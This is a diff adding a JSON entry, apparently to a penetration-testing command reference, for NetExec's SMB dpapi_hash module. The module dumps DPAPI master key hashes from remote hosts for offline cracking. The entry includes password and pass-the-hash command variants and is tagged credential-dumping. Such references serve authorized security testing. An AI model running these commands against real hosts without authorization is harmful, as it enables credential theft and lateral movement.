@@ -1,0 +1,31 @@
+{
+  "id": "nxc-smb-dpapi-hash",
+  "name": "NetExec SMB DPAPI Hash",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M dpapi_hash",
+  "description": "Extract DPAPI master key hashes from remote hosts for offline cracking",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "dpapi",
+    "masterkey",
+    "credential-dumping",
+    "hash"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M dpapi_hash"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'user' -p 'password' -M dpapi_hash"
+  ]
+}
